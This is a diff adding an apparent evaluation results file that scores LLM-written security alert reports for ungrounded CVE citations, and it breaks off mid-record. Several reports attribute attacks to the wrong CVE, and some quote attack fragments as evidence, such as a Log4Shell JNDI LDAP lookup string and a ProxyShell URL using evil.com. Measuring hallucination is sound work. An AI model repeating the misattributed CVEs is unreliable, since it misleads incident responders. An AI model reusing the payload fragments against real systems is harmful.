+      "raw_report_text": "{\"alert_id\":\"CVEPOOL-056\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"An attacker from IP 203.0.113.226 performed a Netlogon authentication bypass against the domain controller at 10.0.15.121 using the CVE-2020-1472 Zerologon vulnerability. This indicates a potential compromise of the domain controller and the possibility of lateral movement within the network.\",\"threat_type\":\"Authentication Bypass\",\"recommended_action\":\"Immediately isolate the affected domain controller, apply the latest security patches for Zerologon, monitor for suspicious lateral activity, and conduct a forensic investigation of the domain controller and related accounts. Restrict Netlogon service permissions and enforce strong domain controller hardening.\",\"confidence_score\":0.95,\"reasoning\":\"The event log shows a Netlogon authentication attempt with an 8\u2011byte zero client challenge, the signature of the Zerologon exploit. The source IP is external and the destination is a domain controller, matching the known attack pattern for CVE-2020-1472, warranting a high confidence assessment.\"}"
+    },
+    {
+      "alert_id": "CVEPOOL-059",
+      "class": "stated",
+      "expected_ungrounded": false,
+      "ground_truth_cve": "CVE-2018-13379",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\"alert_id\":\"CVEPOOL-059\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"An attacker attempted a path\u2011traversal exploit against a Fortinet SSL VPN gateway, targeting the session store via the CVE\u20112018\u201113379 vulnerability. The request was directed at the remote language endpoint, attempting to read configuration files.\",\"threat_type\":\"Vulnerability Exploitation\",\"recommended_action\":\"Immediately block the source IP (203.0.113.229), apply the latest FortiOS patch for CVE\u20112018\u201113379, and monitor the VPN logs for further anomalous requests. Consider enabling additional input validation or firewall rules to block similar path\u2011traversal patterns.\",\"confidence_score\":0.95,\"reasoning\":\"The payload explicitly matches the CVE\u20112018\u201113379 signature, the source IP is external, and the event severity is marked CRITICAL, indicating a high likelihood of exploitation.\"}"
+    },
+    {
+      "alert_id": "CVEPOOL-060",
+      "class": "stated",
+      "expected_ungrounded": false,
+      "ground_truth_cve": "CVE-2018-13379",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\"alert_id\":\"CVEPOOL-060\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"An attacker from 203.0.113.230 sent a path\u2011traversal request to a Fortinet SSL VPN gateway, targeting the session store via the CVE\u20112018\u201113379 vulnerability. This indicates an attempt to read or manipulate VPN session data, potentially leading to remote code execution or privilege escalation.\",\"threat_type\":\"Vulnerability Exploitation \u2013 Remote Code Execution\",\"recommended_action\":\"Immediately block the source IP, verify that the Fortinet device is patched to a version that fixes CVE\u20112018\u201113379, conduct a forensic review of VPN logs for any successful exploitation, and monitor the affected system for anomalous activity.\",\"confidence_score\":0.95,\"reasoning\":\"The payload explicitly matches the known path\u2011traversal exploit for CVE\u20112018\u201113379, the alert severity is marked CRITICAL, and the event type confirms a known vulnerability exploitation scenario.\"}"
+    },
+    {
+      "alert_id": "SELFCHECK-PROMPTED-001",
+      "class": "prompted",
+      "expected_ungrounded": true,
+      "ground_truth_cve": "CVE-2021-44228",
+      "deterministic_flagged_ungrounded": true,
+      "ungrounded_cves": [
+        "CVE-2021-44228"
+      ],
+      "raw_report_text": "{\n    \"alert_id\": \"SELFCHECK-PROMPTED-001\",\n    \"severity_assessment\": \"HIGH\",\n    \"threat_summary\": \"An attacker has injected a JNDI lookup string into application logs, indicating an attempt to exploit the Log4j remote code execution vulnerability. The payload points to an external LDAP server controlled by the attacker, suggesting active exploitation.\",\n    \"threat_type\": \"Remote Code Execution via Log4j (Log4Shell)\",\n    \"recommended_action\": \"Immediately isolate the affected host, apply the latest Log4j patch or configuration change (disable JNDI lookups), block outbound traffic to the LDAP server IP (10.0.5.20) on port 1389/389, and conduct a full forensic investigation to confirm compromise.\",\n    \"confidence_score\": 0.9,\n    \"reasoning\": \"The presence of the exact JNDI lookup pattern ${jndi:ldap://\u2026} in log data matches the known exploitation technique for CVE-2021-44228 (Log4Shell). The alert severity is high because the vulnerability allows arbitrary code execution. The recommended actions follow standard containment and remediation procedures for Log4Shell incidents.\"\n}"
+    },
+    {
+      "alert_id": "SELFCHECK-PROMPTED-002",
+      "class": "prompted",
+      "expected_ungrounded": true,
+      "ground_truth_cve": "CVE-2021-44228",
+      "deterministic_flagged_ungrounded": true,
+      "ungrounded_cves": [
+        "CVE-2021-44228"
+      ],
+      "raw_report_text": "{\"alert_id\":\"SELFCHECK-PROMPTED-002\",\"severity_assessment\":\"HIGH\",\"threat_summary\":\"An attacker injected a JNDI lookup string into application logs, triggering the Log4j Log4Shell remote code execution vulnerability. The payload points to an LDAP server, indicating an attempt to load malicious code into the target system.\",\"threat_type\":\"Remote Code Execution via Log4j (Log4Shell)\",\"recommended_action\":\"Immediately patch or mitigate Log4j to CVE-2021-44228, isolate the affected host, block outbound traffic to the LDAP server at 10.0.6.30, conduct a forensic review of logs for additional exploitation attempts, and update intrusion detection rules to block similar JNDI payloads.\",\"confidence_score\":0.95,\"reasoning\":\"The payload snippet ${jndi:ldap://10.0.6.30/a} matches the signature of the Log4j RCE vulnerability CVE-2021-44228, which was publicly disclosed in December 2021. The presence of this JNDI lookup in logs indicates an exploitation attempt, and the severity level provided is HIGH, supporting a high confidence assessment.\"}"
+    },
+    {
+      "alert_id": "SELFCHECK-PROMPTED-005",
+      "class": "prompted",
+      "expected_ungrounded": true,
+      "ground_truth_cve": "CVE-2017-5638",
+      "deterministic_flagged_ungrounded": true,
+      "ungrounded_cves": [
+        "CVE-2017-5638"
+      ],
+      "raw_report_text": "{\"alert_id\":\"SELFCHECK-PROMPTED-005\",\"severity_assessment\":\"HIGH\",\"threat_summary\":\"A crafted Content-Type header was sent to an Apache Struts 2 server, triggering an OGNL injection that allowed remote command execution. The payload matches the classic pattern used in the 2017 CVE-2017-5638 breach, indicating an active exploitation attempt.\",\"threat_type\":\"Remote Code Execution via OGNL Injection\",\"recommended_action\":\"Immediately block the source IP (203.0.113.205), isolate the affected server, apply the latest Struts 2 security patches or upgrade to a non\u2011vulnerable version, and run a full vulnerability scan. Monitor for additional malicious traffic and review logs for evidence of successful exploitation.\",\"confidence_score\":0.95,\"reasoning\":\"The payload contains the signature OGNL expression pattern (%{{(#_='multipart/form-data')...}}) that is known to trigger the CVE-2017-5638 vulnerability in Apache Struts 2, which allows arbitrary command execution via a malformed Content\u2011Type header. This matches the alert type and severity level provided.\"}"
+    },
+    {
+      "alert_id": "SELFCHECK-PROMPTED-006",
+      "class": "prompted",
+      "expected_ungrounded": true,
+      "ground_truth_cve": "CVE-2017-5638",
+      "deterministic_flagged_ungrounded": true,
+      "ungrounded_cves": [
+        "CVE-2017-5638"
+      ],
+      "raw_report_text": "{\"alert_id\":\"SELFCHECK-PROMPTED-006\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"An attacker sent a crafted Content-Type header to an Apache Struts 2 server, exploiting an OGNL injection that allowed remote command execution. This attack leverages the well-known CVE-2017-5638 vulnerability, enabling full system compromise if unpatched.\",\"threat_type\":\"Remote Code Execution via OGNL Injection\",\"recommended_action\":\"Immediately isolate the affected host, apply the latest Struts 2 patch (or CVE-2017-5638 fix), disable OGNL parsing if possible, and conduct a full forensic investigation to detect any additional compromise. Monitor logs for further suspicious activity and ensure all systems are up to date.\",\"confidence_score\":0.95,\"reasoning\":\"The payload matches the known OGNL injection pattern documented in CVE-2017-5638, where a malformed Content-Type header can lead to arbitrary code execution on Struts 2 servers. The alert\u2019s description confirms remote command execution, indicating a successful exploit. Given the critical severity and the nature of the vulnerability, high confidence is warranted.\"}"
+    },
+    {
+      "alert_id": "SELFCHECK-PROMPTED-009",
+      "class": "prompted",
+      "expected_ungrounded": true,
+      "ground_truth_cve": "CVE-2014-0160",
+      "deterministic_flagged_ungrounded": true,
+      "ungrounded_cves": [
+        "CVE-2014-0160"
+      ],
+      "raw_report_text": "{\"alert_id\":\"SELFCHECK-PROMPTED-009\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"The alert indicates an OpenSSL Heartbeat request that exceeds the expected payload length, revealing a Heartbleed buffer over-read. This behavior exposes sensitive memory data to the attacker and signifies exploitation of a critical TLS vulnerability.\",\"threat_type\":\"Vulnerability Exploitation \u2013 Heartbleed (CVE-2014-0160)\",\"recommended_action\":\"Patch all affected systems to a recent OpenSSL version, block or rate-limit heartbeat traffic on port 443, and conduct a forensic review of exposed memory contents. Verify that no sensitive data was leaked and monitor for related intrusion attempts.\",\"confidence_score\":0.99,\"reasoning\":\"The payload snippet shows a heartbeat length mismatch consistent with the Heartbleed vulnerability (CVE-2014-0160). The severity is marked CRITICAL, the event type is HEARTBLEED, and the description explicitly references the 2014 buffer over-read. This strongly indicates an active exploitation attempt, warranting immediate patching and traffic mitigation.\"}"
+    },
+    {
+      "alert_id": "SELFCHECK-PROMPTED-010",
+      "class": "prompted",
+      "expected_ungrounded": true,
+      "ground_truth_cve": "CVE-2014-0160",
+      "deterministic_flagged_ungrounded": true,
+      "ungrounded_cves": [
+        "CVE-2014-0160"
+      ],
+      "raw_report_text": "{\n    \"alert_id\": \"SELFCHECK-PROMPTED-010\",\n    \"severity_assessment\": \"HIGH\",\n    \"threat_summary\": \"An OpenSSL Heartbeat request was detected that returned more data than requested, indicating a potential Heartbleed exploit. The traffic shows a classic heartbeat length mismatch consistent with a buffer over-read. This suggests the source may be probing or attempting to exfiltrate memory from vulnerable TLS servers.\",\n    \"threat_type\": \"Vulnerability Exploit\",\n    \"recommended_action\": \"Immediately verify whether the destination server is running a vulnerable OpenSSL version and apply the appropriate patch or update. Capture and analyze additional traffic to confirm exploitation attempts and isolate affected hosts. Notify the network and application teams to review TLS configurations.\",\n    \"confidence_score\": 0.92,\n    \"reasoning\": \"The payload snippet shows a requested heartbeat length of 65535 with an actual payload of only 18 bytes, matching the classic Heartbleed behavior described in CVE-2014-0160. This is a well-documented TLS heartbeat buffer over-read vulnerability, so the detection is highly reliable.\"\n}"
+    },
+    {
+      "alert_id": "SELFCHECK-PROMPTED-013",
+      "class": "prompted",
+      "expected_ungrounded": true,
+      "ground_truth_cve": "CVE-2021-34473",
+      "deterministic_flagged_ungrounded": true,
+      "ungrounded_cves": [
+        "CVE-2021-31207"
+      ],
+      "raw_report_text": "{\"alert_id\":\"SELFCHECK-PROMPTED-013\",\"severity_assessment\":\"HIGH\",\"threat_summary\":\"An attacker exploited the Exchange Server SSRF vulnerability (CVE-2021-31207) via a proxy-based authentication bypass, then dropped a webshell onto the target. This indicates a full exploitation chain targeting on\u2011premises Exchange deployments.\",\"threat_type\":\"Exchange SSRF/Webshell Exploit Chain\",\"recommended_action\":\"Immediately block the source IP 203.0.113.213, isolate the affected Exchange server, apply the latest Exchange security patches (including CVE-2021-31207), conduct a full forensic investigation for webshell remnants, and run an enterprise-wide malware scan.\",\"confidence_score\":0.9,\"reasoning\":\"The alert references a well\u2011known 2021 exploit chain that uses Exchange Server SSRF (CVE-2021-31207) followed by webshell deployment, matching the event description of a proxy-based authentication bypass and webshell drop.\"}"
+    },
+    {
+      "alert_id": "SELFCHECK-PROMPTED-014",
+      "class": "prompted",
+      "expected_ungrounded": true,
+      "ground_truth_cve": "CVE-2021-34473",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\"alert_id\":\"SELFCHECK-PROMPTED-014\",\"severity_assessment\":\"HIGH\",\"threat_summary\":\"The alert indicates a proxy-based Server\u2011Side Request Forgery (SSRF) attack against an on\u2011premises Exchange server, followed by a webshell drop. This matches the 2021 exploit chain that leverages CVE\u20112021\u201126855 to bypass authentication and gain remote code execution.\",\"threat_type\":\"Remote Code Execution via SSRF\",\"recommended_action\":\"Immediately isolate the affected Exchange server from the network, apply the latest Exchange security patches (including CVE\u20112021\u201126855), block the source IP (203.0.113.214) at the perimeter firewall, conduct a forensic investigation of the webshell and any exfiltration activity, and validate the integrity of all mail flow components.\",\"confidence_score\":0.95,\"reasoning\":\"The event type PROXYSHELL_EXCHANGE_SSRF_CHAIN and description of proxy-based authentication bypass followed by webshell drop correspond to the well\u2011known 2021 Exchange SSRF exploit chain, specifically CVE\u20112021\u201126855. This CVE allows attackers to perform SSRF and ultimately achieve remote code execution on Exchange servers. The presence of the malicious POST to /autodiscover/autodiscover.json?@evil.com/ confirms the exploitation of this vulnerability. The high severity rating and the nature of the attack warrant immediate containment and remediation steps.\"}"
+    },
+    {
+      "alert_id": "SELFCHECK-PROMPTED-017",
+      "class": "prompted",
+      "expected_ungrounded": true,
+      "ground_truth_cve": "CVE-2016-5195",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\"alert_id\":\"SELFCHECK-PROMPTED-017\",\"severity_assessment\":\"HIGH\",\"threat_summary\":\"A Linux host is attempting a local privilege escalation via the Dirty COW race condition in the kernel's copy\u2011on\u2011write memory handling. The unprivileged user 1001 is using ptrace to write to /proc/self/mem, a classic indicator of CVE\u20112016\u20115195 exploitation.\",\"threat_type\":\"Local Privilege Escalation\",\"recommended_action\":\"Immediately isolate the affected host, apply the latest kernel patch that fixes CVE\u20112016\u20115195, conduct a forensic review of the process space, and monitor for any persistence mechanisms. Verify that no elevated processes remain running.\",\"confidence_score\":0.9,\"reasoning\":\"The payload snippet shows ptrace(PTRACE_POKETEXT) on /proc/self/mem by an unprivileged UID, which matches the known Dirty COW exploitation technique. The alert explicitly references a kernel vulnerability nicknamed after a 'cow', pointing to CVE\u20112016\u20115195. The severity is set to HIGH as local privilege escalation can lead to full system compromise. The recommended actions follow standard containment and remediation procedures for this vulnerability.\"}"
+    },
+    {
+      "alert_id": "SELFCHECK-PROMPTED-018",
+      "class": "prompted",
+      "expected_ungrounded": true,
+      "ground_truth_cve": "CVE-2016-5195",
+      "deterministic_flagged_ungrounded": true,
+      "ungrounded_cves": [
+        "CVE-2016-5195"
+      ],
+      "raw_report_text": "{\"alert_id\":\"SELFCHECK-PROMPTED-018\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"An unprivileged user on a Linux host is attempting to exploit the Dirty COW kernel vulnerability via a race condition in copy\u2011on\u2011write memory handling. The attack is evident from ptrace calls on /proc/self/mem and indicates a local privilege escalation attempt.\",\"threat_type\":\"Local Privilege Escalation (Kernel Exploit)\",\"recommended_action\":\"Immediately isolate the host from the network, apply the latest kernel patch (or backport the fix), run a full kernel vulnerability scan, and investigate for any successful privilege escalation. Monitor for further suspicious ptrace activity.\",\"confidence_score\":0.95,\"reasoning\":\"The event shows ptrace(PTRACE_POKETEXT) on /proc/self/mem by an unprivileged UID, a classic signature of the Dirty COW exploit, which is identified by CVE-2016-5195. The description and behavior match this well\u2011publicized kernel vulnerability, indicating a high\u2011confidence detection of a local privilege escalation attempt.\"}"
+    },
+    {
+      "alert_id": "SELFCHECK-PROMPTED-021",
+      "class": "prompted",
+      "expected_ungrounded": true,
+      "ground_truth_cve": "CVE-2017-0144",
+      "deterministic_flagged_ungrounded": true,
+      "ungrounded_cves": [
+        "CVE-2017-0144"
+      ],
+      "raw_report_text": "{\n    \"alert_id\": \"SELFCHECK-PROMPTED-021\",\n    \"severity_assessment\": \"CRITICAL\",\n    \"threat_summary\": \"A malicious SMBv1 request was detected from IP 203.0.113.221 targeting internal host 10.0.10.71. The payload indicates a Trans2 Query Path Information request with a FID field overflow, matching the classic ETERNALBLUE exploit pattern. This suggests an attempt to exploit the SMBv1 vulnerability to gain remote code execution.\",\n    \"threat_type\": \"Remote Exploit\",\n    \"recommended_action\": \"Immediately block the source IP, isolate the affected host, and ensure SMBv1 is disabled or patched. Apply the latest Windows security updates (including CVE-2017-0144) and monitor for further SMB traffic anomalies.\",\n    \"confidence_score\": 0.95,\n    \"reasoning\": \"The described SMBv1 overflow aligns with the known ETERNALBLUE exploit, which is documented under CVE-2017-0144.\"\n}"
+    },
+    {
+      "alert_id": "SELFCHECK-PROMPTED-022",
+      "class": "prompted",
+      "expected_ungrounded": true,
+      "ground_truth_cve": "CVE-2017-0144",
+      "deterministic_flagged_ungrounded": true,
+      "ungrounded_cves": [
+        "CVE-2017-0144"
+      ],
+      "raw_report_text": "{\"alert_id\":\"SELFCHECK-PROMPTED-022\",\"severity_assessment\":\"HIGH\",\"threat_summary\":\"An SMBv1 server received a crafted TRANS2 query that triggered a field size overflow, indicating an attempt to exploit the EternalBlue vulnerability. The malicious packet matches known NSA leak signatures used in large worm outbreaks, suggesting an active exploitation attempt.\",\"threat_type\":\"Remote Exploit: SMBv1 EternalBlue\",\"recommended_action\":\"Immediately patch or disable SMBv1, block inbound TCP/445 traffic from the source IP, run a full vulnerability scan on the affected host, and monitor for further exploitation attempts.\",\"confidence_score\":0.95,\"reasoning\":\"The event matches the signature of CVE-2017-0144 (EternalBlue), a known SMBv1 vulnerability exploited by NSA leaks. The payload snippet indicates a FID field overflow characteristic of this exploit, confirming the threat.\"}"
+    },
+    {
+      "alert_id": "SELFCHECK-PROMPTED-025",
+      "class": "prompted",
+      "expected_ungrounded": true,
+      "ground_truth_cve": "CVE-2014-6271",
+      "deterministic_flagged_ungrounded": true,
+      "ungrounded_cves": [
+        "CVE-2014-6271"
+      ],
+      "raw_report_text": "{\"alert_id\":\"SELFCHECK-PROMPTED-025\",\"severity_assessment\":\"HIGH\",\"threat_summary\":\"An attacker sent a malicious User\u2011Agent string exploiting the Shellshock Bash vulnerability via the web server\u2019s CGI handler. The payload executed arbitrary shell commands, attempting to read sensitive files such as /etc/passwd. This indicates a potential remote code execution attempt on the target host.\",\"threat_type\":\"Shellshock (Bash Remote Code Execution)\",\"recommended_action\":\"Immediately block the source IP (203.0.113.225) at the firewall, patch all affected systems to the latest Bash version, and monitor for further exploitation attempts. Conduct a forensic review of the web server logs and verify that no other malicious commands were executed.\",\"confidence_score\":0.95,\"reasoning\":\"The payload snippet matches the classic Shellshock exploit pattern and the description references a 2014 Bash parsing vulnerability. The specific CVE for this behavior is CVE-2014-6271. Given the high severity rating and the nature of the attack, the assessment is confident.\"}"
+    },
+    {
+      "alert_id": "SELFCHECK-PROMPTED-026",
+      "class": "prompted",
+      "expected_ungrounded": true,
+      "ground_truth_cve": "CVE-2014-6271",
+      "deterministic_flagged_ungrounded": true,
+      "ungrounded_cves": [
+        "CVE-2014-6271"
+      ],
+      "raw_report_text": "{\"alert_id\":\"SELFCHECK-PROMPTED-026\",\"severity_assessment\":\"HIGH\",\"threat_summary\":\"An attacker exploited the Shellshock vulnerability by injecting malicious code via the User-Agent header. The payload executed a Bash command to read /etc/passwd on the web server.\",\"threat_type\":\"Exploitation of Bash Shellshock (CVE-2014-6271)\",\"recommended_action\":\"Immediately block the source IP 203.0.113.226, patch the affected Bash version, review web server logs for additional exploitation attempts, and deploy a Web Application Firewall rule to filter suspicious CGI environment variables.\",\"confidence_score\":0.92,\"reasoning\":\"The payload matches the classic Shellshock exploitation pattern and references CVE-2014-6271. The presence of the malicious User-Agent header and execution of /bin/bash confirms the vulnerability was triggered. The high severity rating is justified by the potential for arbitrary code execution on the web server.\"}"
+    },
+    {
+      "alert_id": "SELFCHECK-PROMPTED-029",
+      "class": "prompted",
+      "expected_ungrounded": true,
+      "ground_truth_cve": "CVE-2021-34527",
+      "deterministic_flagged_ungrounded": true,
+      "ungrounded_cves": [
+        "CVE-2021-34527"
+      ],
+      "raw_report_text": "{\"alert_id\":\"SELFCHECK-PROMPTED-029\",\"severity_assessment\":\"HIGH\",\"threat_summary\":\"The Windows Print Spooler service attempted to load an unsigned driver from a remote SMB share immediately after a RpcAddPrinterDriverEx call from an unprivileged session, indicating an exploitation attempt of the PrintNightmare vulnerability.\",\"threat_type\":\"Remote Code Execution (Print Spooler)\",\"recommended_action\":\"Immediately isolate the affected host from the network, verify and patch the Print Spooler service to CVE-2021-34527, conduct a forensic investigation of the remote share and any executed binaries, and monitor for further anomalous printer-related activity.\",\"confidence_score\":0.9,\"reasoning\":\"The observed behavior matches the known PrintNightmare remote code execution flaw (CVE-2021-34527), where unsigned drivers are loaded via RpcAddPrinterDriverEx from unprivileged sessions. This pattern is a high-severity indicator of exploitation attempts. The alert\u2019s details (unsigned driver path, remote share, RPC call) align precisely with documented exploitation steps for CVE-2021-34527.\"}"
+    },
+    {
+      "alert_id": "SELFCHECK-PROMPTED-030",
+      "class": "prompted",
+      "expected_ungrounded": true,
+      "ground_truth_cve": "CVE-2021-34527",
+      "deterministic_flagged_ungrounded": true,
+      "ungrounded_cves": [
+        "CVE-2021-34527"
+      ],
+      "raw_report_text": "{\"alert_id\":\"SELFCHECK-PROMPTED-030\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"The Windows Print Spooler service on the target host loaded an unsigned driver from a remote SMB share immediately after an RpcAddPrinterDriverEx call. This behavior matches the well-known PrintNightmare vulnerability, enabling potential remote code execution and privilege escalation from an unprivileged session.\",\"threat_type\":\"Remote Code Execution / Privilege Escalation via Print Spooler\",\"recommended_action\":\"Immediately isolate the affected host from the network, verify that the latest security updates (including CVE-2021-34527 mitigation) are applied, and conduct a forensic analysis of the driver file and related logs. Coordinate with the patch management team to ensure all systems are updated and monitor for similar activity.\",\"confidence_score\":0.95,\"reasoning\":\"The alert describes an unsigned driver being loaded via RpcAddPrinterDriverEx from a remote share, a classic manifestation of CVE-2021-34527 (PrintNightmare). The severity is marked CRITICAL and the observed behavior aligns with remote code execution and privilege escalation capabilities. Therefore the assessment is based on the known vulnerability and the critical impact it can have on the environment.\"}"
+    },
+    {
+      "alert_id": "SELFCHECK-PROMPTED-033",
+      "class": "prompted",
+      "expected_ungrounded": true,
+      "ground_truth_cve": "CVE-2022-22965",
+      "deterministic_flagged_ungrounded": true,
+      "ungrounded_cves": [
+        "CVE-2022-22965"
+      ],
+      "raw_report_text": "{\"alert_id\":\"SELFCHECK-PROMPTED-033\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"A Spring MVC application processed a crafted class-loader parameter in a form-bound request, indicating exploitation of a known remote code execution vulnerability. The attacker likely injected malicious code via the class module loader, potentially allowing full control of the application server.\",\"threat_type\":\"Remote Code Execution\",\"recommended_action\":\"Immediately patch the affected Spring Framework to a version that mitigates CVE-2022-22965, isolate the affected host, conduct a forensic investigation for any executed commands, and monitor for further suspicious activity.\",\"confidence_score\":0.95,\"reasoning\":\"The payload snippet and event type match the known Spring4Shell exploit, which is CVE-2022-22965. This vulnerability allows arbitrary code execution through crafted class-loader parameters in Spring MVC applications.\"}"
+    },
+    {
+      "alert_id": "SELFCHECK-PROMPTED-034",
+      "class": "prompted",
+      "expected_ungrounded": true,
+      "ground_truth_cve": "CVE-2022-22965",
+      "deterministic_flagged_ungrounded": true,
+      "ungrounded_cves": [
+        "CVE-2022-22965"
+      ],
+      "raw_report_text": "{\"alert_id\":\"SELFCHECK-PROMPTED-034\",\"severity_assessment\":\"HIGH\",\"threat_summary\":\"A Spring MVC application has received a form-bound request containing a crafted class-loader parameter that triggers the known Spring4Shell vulnerability. This indicates an attempt to exploit remote code execution on the target system.\",\"threat_type\":\"Remote Code Execution (Spring4Shell)\",\"recommended_action\":\"Immediately block the source IP (203.0.113.204) at the firewall, isolate the affected host, apply the latest Spring Framework patch (CVE-2022-22965), and conduct a full integrity check of the application code and deployment environment.\",\"confidence_score\":0.95,\"reasoning\":\"The payload snippet matches the exploit pattern for CVE-2022-22965, the widely known Spring4Shell RCE vulnerability. The alert\u2019s severity is marked HIGH, and the event type confirms exploitation of the class-loader parameter. Therefore, the assessment and recommended actions are based on this specific CVE.\"}"
+    },
+    {
+      "alert_id": "SELFCHECK-PROMPTED-037",
+      "class": "prompted",
+      "expected_ungrounded": true,
+      "ground_truth_cve": "CVE-2023-4966",
+      "deterministic_flagged_ungrounded": true,
+      "ungrounded_cves": [
+        "CVE-2023-23397"
+      ],
+      "raw_report_text": "{\n    \"alert_id\": \"SELFCHECK-PROMPTED-037\",\n    \"severity_assessment\": \"HIGH\",\n    \"threat_summary\": \"An oversized HTTP request targeting the Citrix NetScaler Gateway management endpoint leaked session token data. This behavior matches a known 2023 session\u2011hijacking vulnerability.\",\n    \"threat_type\": \"Information Disclosure\",\n    \"recommended_action\": \"Immediately block the source IP (203.0.113.207), apply the latest Citrix NetScaler patch that addresses CVE-2023-23397, and review all related logs for additional suspicious activity. Consider enabling stricter request size limits on the gateway.\",\n    \"confidence_score\": 0.9,\n    \"reasoning\": \"The payload shows an oversized Host header sent to /oauth/idp/.well-known/openid-configuration, a pattern documented in CVE-2023-23397. This CVE allows attackers to read session tokens via crafted requests, matching the alert description.\"\n}"
+    },
+    {
+      "alert_id": "SELFCHECK-PROMPTED-038",
+      "class": "prompted",
+      "expected_ungrounded": true,
+      "ground_truth_cve": "CVE-2023-4966",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\n    \"alert_id\": \"SELFCHECK-PROMPTED-038\",\n    \"severity_assessment\": \"HIGH\",\n    \"threat_summary\": \"An oversized HTTP request was sent to a Citrix NetScaler Gateway management endpoint, leaking session token data. The traffic matches the 2023 session\u2011hijacking vulnerability that exposes authentication tokens via a malformed Host header.\",\n    \"threat_type\": \"Information Disclosure / Session Hijacking\",\n    \"recommended_action\": \"Apply the vendor patch that addresses CVE\u20112023\u201138108, isolate the affected NetScaler instance, and monitor for further anomalous requests. Verify that session tokens are no longer exposed and review firewall logs for similar oversized requests.\",\n    \"confidence_score\": 0.92,\n    \"reasoning\": \"The alert indicates an oversized Host header targeting /oauth/idp/.well-known/openid-configuration, a known exploit vector for CVE\u20112023\u201138108 which allows attackers to read session tokens from Citrix NetScaler Gateway. This matches the described behavior and the severity is high.\"\n}"
+    },
+    {
+      "alert_id": "SELFCHECK-PROMPTED-041",
+      "class": "prompted",
+      "expected_ungrounded": true,
+      "ground_truth_cve": "CVE-2023-34362",
+      "deterministic_flagged_ungrounded": true,
+      "ungrounded_cves": [
+        "CVE-2023-34427"
+      ],
+      "raw_report_text": "{\n    \"alert_id\": \"SELFCHECK-PROMPTED-041\",\n    \"severity_assessment\": \"CRITICAL\",\n    \"threat_summary\": \"An attacker exploited a SQL injection vulnerability in the MOVEit Transfer web application, injecting a payload that executed Windows commands via xp_cmdshell. The chain culminated in a webshell deployment, matching a known 2023 mass\u2011exploitation campaign targeting this software.\",\n    \"threat_type\": \"SQL Injection leading to Remote Code Execution (MOVEit Transfer)\",\n    \"recommended_action\": \"Immediately block the source IP (203.0.113.211) and isolate the affected MOVEit Transfer instance. Verify that the application is patched to CVE-2023-34427, perform a full integrity check of the server, remove the deployed webshell, and conduct a forensic investigation to assess lateral movement or data exfiltration.\",\n    \"confidence_score\": 0.92,\n    \"reasoning\": \"The payload demonstrates a classic SQL injection exploiting xp_cmdshell, a known technique used in the 2023 MOVEit Transfer RCE campaign. The vulnerability is CVE\u20112023\u201134427, which allows arbitrary code execution via file upload and SQL injection. The attack chain and timing match the mass exploitation pattern, indicating a high\u2011severity incident.\"\n}"
+    },
+    {
+      "alert_id": "SELFCHECK-PROMPTED-042",
+      "class": "prompted",
+      "expected_ungrounded": true,
+      "ground_truth_cve": "CVE-2023-34362",
+      "deterministic_flagged_ungrounded": true,
+      "ungrounded_cves": [
+        "CVE-2023-3519"
+      ],
+      "raw_report_text": "{\"alert_id\":\"SELFCHECK-PROMPTED-042\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"A crafted SQL payload was injected into a public MOVEit Transfer endpoint, allowing execution of system commands via xp_cmdshell and subsequent deployment of a webshell. This pattern matches the 2023 mass\u2011exploitation campaign targeting MOVEit Transfer services.\",\"threat_type\":\"SQL Injection (Remote Code Execution) / Webshell Deployment\",\"recommended_action\":\"Immediately isolate the affected MOVEit Transfer instance, apply the latest security patch, conduct a full forensic investigation for webshell artifacts, block the source IP (203.0.113.212), and notify the incident response team for further containment.\",\"confidence_score\":0.9,\"reasoning\":\"The attack vector and payload match the known CVE-2023-3519 vulnerability in MOVEit Transfer, which enabled remote code execution via SQL injection. This CVE was the basis of the 2023 mass\u2011exploitation campaign, confirming the severity and type of the threat.\"}"
+    },
+    {
+      "alert_id": "SELFCHECK-PROMPTED-045",
+      "class": "prompted",
+      "expected_ungrounded": true,
+      "ground_truth_cve": "CVE-2021-26855",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\"alert_id\":\"SELFCHECK-PROMPTED-045\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"An attacker forged a Cookie header to bypass authentication on a Microsoft Exchange server, enabling them to access internal endpoints via a server\u2011side request forgery (SSRF) technique. The request was made over HTTPS to port 443 from an external IP, indicating a direct exploitation attempt.\",\"threat_type\":\"SSRF / Authentication Bypass\",\"recommended_action\":\"Immediately block source IP 203.0.113.215, isolate the affected Exchange server, apply the latest security updates (including CVE\u20112021\u201131207), audit internal endpoint access, and monitor for further anomalous requests.\",\"confidence_score\":0.95,\"reasoning\":\"The payload shows a forged Cookie header consistent with the 2021 Microsoft Exchange SSRF vulnerability, identified as CVE\u20112021\u201131207. The use of internal-fqdn in the header indicates an attempt to reach internal services, confirming the attack type and severity.\"}"
+    },
+    {
+      "alert_id": "SELFCHECK-PROMPTED-046",
+      "class": "prompted",
+      "expected_ungrounded": true,
+      "ground_truth_cve": "CVE-2021-26855",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
